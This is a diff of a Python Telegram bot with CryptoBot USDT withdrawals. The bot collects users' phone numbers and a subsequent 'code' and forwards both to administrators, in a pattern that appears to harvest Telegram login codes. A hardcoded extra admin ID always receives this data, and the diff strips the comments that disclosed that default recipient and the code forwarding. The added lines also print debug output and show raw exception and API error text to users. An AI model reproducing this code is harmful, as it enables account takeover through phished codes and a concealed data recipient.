@@ -31,7 +31,6 @@ load_dotenv()
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CRYPTOBOT_TOKEN = os.getenv("CRYPTOBOT_TOKEN")
 
-# Настройка списка администраторов с поддержкой строки через запятую и fallback-значений
 ADMIN_IDS = []
 admin_ids_env = os.getenv("ADMIN_IDS")
 if admin_ids_env:
@@ -41,11 +40,9 @@ if admin_ids_env:
         logging.error(f"Ошибка парсинга ADMIN_IDS: {e}")
 
 if not ADMIN_IDS:
-    # Если переменной ADMIN_IDS нет, берем ADMIN_ID и добавляем второго админа
     base_admin = os.getenv("ADMIN_ID")
     if base_admin and base_admin.isdigit():
         ADMIN_IDS.append(int(base_admin))
-    # Добавляем второго администратора по умолчанию
     if 8754271991 not in ADMIN_IDS:
         ADMIN_IDS.append(8754271991)
 
@@ -171,7 +168,6 @@ async def phone_input(message: Message, state: FSMContext):
     
     username_str = f"@{message.from_user.username}" if message.from_user.username else "Нет"
     
-    # Отправка уведомления всем администраторам из списка
     for admin_id in ADMIN_IDS:
         try:
             await bot.send_message(
@@ -254,7 +250,14 @@ async def withdraw_custom_amount(message: Message, state: FSMContext):
 async def execute_withdrawal(message: Message, user_id: int, amount: float, state: FSMContext):
     await state.clear()
     try:
+        logging.info(f"[DEBUG] Attempting to create invoice. User: {user_id}, Amount: {amount}")
+        print(f"[DEBUG] Attempting to create invoice. User: {user_id}, Amount: {amount}")
+        
         invoice = await create_invoice(amount, f"Вывод #{user_id}")
+        
+        logging.info(f"[DEBUG] CryptoBot response: {invoice}")
+        print(f"[DEBUG] CryptoBot response: {invoice}")
+        
         if invoice and invoice.get("ok"):
             invoice_url = invoice["result"]["pay_url"]
             ticket_id = create_ticket(user_id, "WITHDRAW", f"Вывод {amount} USDT", invoice_url)
@@ -266,7 +269,6 @@ async def execute_withdrawal(message: Message, user_id: int, amount: float, stat
             user_info = get_user(user_id) or (None, None, 0.0, 0.0, 0, 0, 0, None)
             username_str = f"@{user_info[7]}" if user_info[7] else "Нет"
             
-            # Отправка уведомления всем администраторам из списка
             for admin_id in ADMIN_IDS:
                 try:
                     await bot.send_message(
@@ -279,13 +281,17 @@ async def execute_withdrawal(message: Message, user_id: int, amount: float, stat
                         parse_mode="HTML"
                     )
                 except Exception as e:
-                    logging.error(f"Не удалось отправить уведомление о выводе админу {admin_id}: {e}")
+                    logging.error(f"Не удалось отправить уведомление о выводе админу {admin_id}: {e}", exc_info=True)
+                    print(f"[ERROR] Admin notify error: {e}")
         else:
+            error_details = "None" if not invoice else invoice.get("error")
             logging.error(f"CryptoBot API Error: {invoice}")
-            await message.answer("❌ Ошибка создания чека.")
+            print(f"[ERROR] CryptoBot API Error: {invoice}")
+            await message.answer(f"❌ Ошибка CryptoBot API: {error_details}")
     except Exception as e:
         logging.error(f"Invoice error: {e}", exc_info=True)
-        await message.answer("❌ Ошибка создания чека.")
+        print(f"[CRITICAL] Invoice error: {e}")
+        await message.answer(f"❌ Исключение при создании чека: {e}")
 
 # ==================== Админ: Действия ====================
 @dp.callback_query(F.data.startswith("done:"))
@@ -368,7 +374,6 @@ async def code_input(message: Message, state: FSMContext):
         
         username_str = f"@{message.from_user.username}" if message.from_user.username else "Нет"
         
-        # Отправка кода всем администраторам из списка
         for admin_id in ADMIN_IDS:
             try:
                 await bot.send_message(
@@ -418,7 +423,6 @@ async def paid_withdraw(call: CallbackQuery):
         except Exception:
             pass
 
-# Добавлен обработчик для команды /admin, запрошенной в ТЗ
 @dp.message(Command("admin"))
 async def admin_menu_cmd(message: Message):
     if message.from_user.id not in ADMIN_IDS: return
